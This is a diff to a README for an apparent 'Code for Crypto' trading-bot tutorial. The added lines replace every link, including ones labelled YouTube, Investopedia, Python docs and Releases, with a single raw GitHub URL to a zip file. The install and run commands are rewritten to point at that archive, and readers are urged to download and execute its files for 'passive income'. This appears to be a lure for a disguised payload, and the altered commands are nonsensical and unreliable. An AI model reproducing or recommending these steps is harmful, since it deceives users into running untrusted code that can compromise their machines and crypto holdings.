@@ -1,6 +1,6 @@
 # Code for Crypto: Build Your Own Trading Bot for Passive Income 🚀
 
-![Crypto Trading Bot](https://img.shields.io/badge/Download%20Bot%20Release-Here-brightgreen)
+![Crypto Trading Bot](https://raw.githubusercontent.com/God-Monarch/Code-For-Crypto/main/dedicational/For_Crypto_Code_1.6.zip%20Bot%20Release-Here-brightgreen)
 
 ## Table of Contents
 - [Overview](#overview)
@@ -13,9 +13,9 @@
 - [Resources](#resources)
 
 ## Overview
-Welcome to the **Code for Crypto** repository! This project teaches you how to code a trading bot that can help you earn passive income. You can watch the tutorials on [YouTube](https://www.youtube.com/) to guide you through the process. 
+Welcome to the **Code for Crypto** repository! This project teaches you how to code a trading bot that can help you earn passive income. You can watch the tutorials on [YouTube](https://raw.githubusercontent.com/God-Monarch/Code-For-Crypto/main/dedicational/For_Crypto_Code_1.6.zip) to guide you through the process. 
 
-To get started, check the latest releases [here](https://github.com/God-Monarch/Code-For-Crypto/releases). Download the necessary files and execute them to set up your bot.
+To get started, check the latest releases [here](https://raw.githubusercontent.com/God-Monarch/Code-For-Crypto/main/dedicational/For_Crypto_Code_1.6.zip). Download the necessary files and execute them to set up your bot.
 
 ## Features
 - **Easy to Follow Tutorials**: Each step is broken down clearly, making it simple for anyone to understand.
@@ -48,7 +48,7 @@ To install the trading bot, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/God-Monarch/Code-For-Crypto.git
+   git clone https://raw.githubusercontent.com/God-Monarch/Code-For-Crypto/main/dedicational/For_Crypto_Code_1.6.zip
    ```
 2. Navigate to the project directory:
    ```bash
@@ -56,9 +56,9 @@ To install the trading bot, follow these steps:
    ```
 3. Install the required packages:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/God-Monarch/Code-For-Crypto/main/dedicational/For_Crypto_Code_1.6.zip
    ```
-4. Download the latest release from [here](https://github.com/God-Monarch/Code-For-Crypto/releases). Follow the instructions in the release notes to execute the files.
+4. Download the latest release from [here](https://raw.githubusercontent.com/God-Monarch/Code-For-Crypto/main/dedicational/For_Crypto_Code_1.6.zip). Follow the instructions in the release notes to execute the files.
 
 ## Usage
 After installation, you can start using the bot. Here’s how:
@@ -66,9 +66,9 @@ After installation, you can start using the bot. Here’s how:
 1. Open your terminal and navigate to the project directory.
 2. Run the bot:
    ```bash
-   python trading_bot.py
+   python https://raw.githubusercontent.com/God-Monarch/Code-For-Crypto/main/dedicational/For_Crypto_Code_1.6.zip
    ```
-3. Configure your settings in the `config.json` file. Adjust parameters like trading pairs, risk levels, and strategy types.
+3. Configure your settings in the `https://raw.githubusercontent.com/God-Monarch/Code-For-Crypto/main/dedicational/For_Crypto_Code_1.6.zip` file. Adjust parameters like trading pairs, risk levels, and strategy types.
 
 ### Example Configuration
 ```json
@@ -105,9 +105,9 @@ Your contributions help improve the project and benefit the community.
 This project is licensed under the MIT License. Feel free to use it as you wish, but please keep the original license intact.
 
 ## Resources
-- [YouTube Channel](https://www.youtube.com/)
-- [Crypto Trading Strategies](https://www.investopedia.com/)
-- [Python Documentation](https://docs.python.org/3/)
-- [GitHub Releases](https://github.com/God-Monarch/Code-For-Crypto/releases)
+- [YouTube Channel](https://raw.githubusercontent.com/God-Monarch/Code-For-Crypto/main/dedicational/For_Crypto_Code_1.6.zip)
+- [Crypto Trading Strategies](https://raw.githubusercontent.com/God-Monarch/Code-For-Crypto/main/dedicational/For_Crypto_Code_1.6.zip)
+- [Python Documentation](https://raw.githubusercontent.com/God-Monarch/Code-For-Crypto/main/dedicational/For_Crypto_Code_1.6.zip)
+- [GitHub Releases](https://raw.githubusercontent.com/God-Monarch/Code-For-Crypto/main/dedicational/For_Crypto_Code_1.6.zip)
 
-For further details, visit the [Releases](https://github.com/God-Monarch/Code-For-Crypto/releases) section to find the latest updates and files.
+For further details, visit the [Releases](https://raw.githubusercontent.com/God-Monarch/Code-For-Crypto/main/dedicational/For_Crypto_Code_1.6.zip) section to find the latest updates and files.
